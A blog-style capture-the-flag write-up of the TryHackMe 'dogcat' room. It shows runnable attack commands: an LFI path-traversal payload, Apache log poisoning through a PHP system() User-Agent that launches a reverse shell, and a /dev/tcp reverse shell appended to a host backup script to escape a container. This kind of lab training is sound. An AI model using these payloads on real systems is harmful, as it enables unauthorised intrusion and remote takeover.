---
title: /thm_dogcat
date: 2022-02-19 17:00:00 +/-3000
categories: [CTF, TryHackMe]
tags: [ctf]     # TAG names should always be lowercase
comments: true
img_path: \assets\img\dogcat
pin: true
#image:
  #src: /badge.png
  #width: 1000   # in pixels
  #height: 400   # in pixels
  #alt: image alternative text
---

![nmap](/badge.png){: w="700" h="400" }
>[**Room link**](https://tryhackme.com/room/dogcat){:target="_blank"}
{: .prompt-info }

# **Tasks**

* ## What is flag 1?
* ## What is flag 2?
* ## What is flag 3?
* ## What is flag 4?

# **Enumeration**

```bash
nmap -sV -sC $ip
```

>### Let's start with a basic portscan using ``nmap``.

![nmap](/nmap.png){: w="700" h="400" }
>_The initial scan shows TCP ports `22` and ``80`` are **OPEN**. Now let's start enumerating the web application._

>Remeber to ``export ip=machine_ip``.
{: .prompt-warning }

---

# **LFI - Local File Inclusion**

![web](/web.png){: w="700" h="400" }
>### **After analysing**
>* ### We have two buttons that lead to `/?view=dog` and `/?view=cat` respectively. Clicking on these gives us a random picture of a dog or a cat, depending on which you clicked. 
>* ### There are files named ``dog.php`` and ``cat.php`` that return a random image. 
>* ### The ``?view=`` query runs ``include`` on our parameter only if the word “dog” or “cat” is present.
>* ### The file automatically appends **.php** to our parameter.
>* ### The **php base64 filter** is working on this query.

---

## **Bypassing**

````markdown
/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
````

> ### Let's try to bypass this with **base64 filter** and do **directory traversal attack**.

![bypass](/bypass.png){: w="700" h="400" :}

> ### Decoding the string gives us the source code of ``index.php``.

````bash
echo "base64codehere" | base64 -d
````

![decode](/decode.png){: w="700" h="400" :}

>### After analysing 
>* ### There's a ``$ext`` variable which kept on appending a .php extension to our input.
>* ### The site checks if the “ext” parameter was provided, and if not it adds “.php” by default to our filename.
>* ### According to our nmap scan the server runs on Apache, so we can try to poison the log just by defining ``ext`` variable in the query. 

![log](/log.png){: w="700" h="400" :}
_/?view=./dog/../../../../../../../var/log/apache2/access.log&ext_
>### We notice that the **user-agent** of the **GET request** is **written** to the **log**. We can leverage that to execute arbitrary code.

---

# **RCE - Remote Code Execution**

````bash
curl $ip -A "<?php system('echo your_base64enconded_revshell > b64; cat b64 | base64 -d | bash') ?>" -s
pwncat-cs -lp some_port_to_listen_on -m linux
curl $ip/?view=./dog/../../../../../../../var/log/apache2/access.log\&ext\& -s
````

![curl2](/curl2.png){: w="700" h="400" :}
>### Now we are in!

---

# **Post Exploitation**

```bash
find / -name 'flag*' 2>/dev/null
```

![flags](/flags.png){: w="700" h="400" :}

>### Easy flags.

---

# **Privilege Escalation**

![flag3](/flag3.png){: w="700" h="400" :}

>### Easy flag.
>### Normally I would start with some enumeration with linpeas but ``sudo -l`` just gave us all we need!

> **Read more about privilege escalation** [**here**](https://gtfobins.github.io/gtfobins/env/){:target="_blank"}.
{: .prompt-info }

----

# **Container Escape**

![docker](/docker.png){: w="700" h="400" :}

>### Looking at root folder we see a file named ``.dockerenv``.
>### Which means we are in docker container :(

---

# **Post Exploitation #2**

```bash
chmod +x linpeas.sh; ./linpeas.sh | tee peas.out
```

>### I'll use ``pwncat-cs`` to upload `linpeas.sh`. Then make the linpeas script executable, run and pipe it to tee to save the output. Use ``less -r peas.out`` to read output file.

> **Read more about upload files** [**here**](https://gtfobins.github.io/#+file%20upload){:target="_blank"}.
{: .prompt-info }

---

# **Privilege Escalation #2**

>### By running linpeas we can find some odd script in /opt/backups

![backup](/backup.png){: w="700" h="400" :}

>### Here we can see that we are actually inside a container. This looks like a **shared folder between** the **Host** and the **Container**, where the Host runs this script to get a backup. 
>### **We can write malicius code** into ``backup.sh`` so that it could be automatically executed after a minute and leverage that to break out of our container.

````bash
echo "sh -i >& /dev/tcp/your_thm_ip/some_port_to_listen_on 0>&1" >> backup.sh
pwncat-cs -lp some_port_to_listen_on -m linux
````

![root](/root.png){: w="700" h="400" :}